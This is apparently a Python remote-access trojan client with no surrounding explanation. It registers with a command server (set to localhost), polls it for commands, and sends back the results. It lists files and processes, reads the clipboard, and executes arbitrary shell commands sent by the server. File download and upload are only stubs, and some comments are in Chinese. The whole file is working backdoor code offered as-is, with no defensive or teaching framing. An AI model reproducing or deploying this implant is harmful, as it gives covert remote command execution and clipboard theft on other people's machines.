import requests
import time
import uuid
import os
import subprocess
import pyperclip

server_url = "http://127.0.0.1:8080/client"
client_uuid = str(uuid.uuid4())

print(client_uuid)
try:
    response = requests.post(server_url, headers={"UUID": client_uuid})
    print("Register Response:", response.text)
except requests.RequestException as e:
    print("Failed to register with server:", e)

def list_files():
    try:
        files = os.listdir('.')
        result = "\n".join(files)
        return result
    except Exception as e:
        return "Error listing files: " + str(e)

def get_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content
    except Exception as e:
        return "Error getting clipboard content: " + str(e)

def download_file(filename):
    try:
        if os.path.exists(filename):
            result = f"File {filename} is available for download."
        else:
            result = f"File {filename} not found!"
        return result
    except Exception as e:
        return "Error handling download: " + str(e)

def upload_file(filename):
    try:
        result = f"Uploading file: {filename} (not yet implemented)"
        return result
    except Exception as e:
        return "Error uploading file: " + str(e)

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, text=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Error executing command: " + str(e)

def list_processes():
    try:
        output = subprocess.check_output("ps -aux", shell=True, text=True)
        return output
    except Exception as e:
        return "Error listing processes: " + str(e)

def handle_command(command):
    try:
        if command == "list_files":
            result = list_files()
        elif command == "get_clipboard":
            result = get_clipboard()
        elif command.startswith("download_file "):
            result = download_file(command.split(" ", 1)[1])
        elif command.startswith("upload_file "):
            result = upload_file(command.split(" ", 1)[1])
        elif command.startswith("execute_command "):
            result = execute_command(command.split(" ", 1)[1])
        elif command == "list_processes":
            result = list_processes()
    except Exception as e:
        return {"status": "error", "message": str(e)}
    return result

while True:
    try:
        response = requests.get(server_url, headers={"UUID": client_uuid}, timeout=10)
        server_data = response.json()
        print("Server Response:", server_data)

        if "command" in server_data:
            command = server_data["command"]
            result = handle_command(command)
            print("Command Result:", result)
            requests.post(server_url, headers={"UUID": client_uuid}, json={"result": result})
    except requests.ConnectionError as e:
        print("Connection error, retrying in 30 seconds:", e)
        time.sleep(30)  # 等待 30 秒后重试
    except requests.RequestException as e:
        print("Request error:", e)
    except Exception as e:
        print("Unexpected error:", e)
    time.sleep(5)  # 默认请求间隔
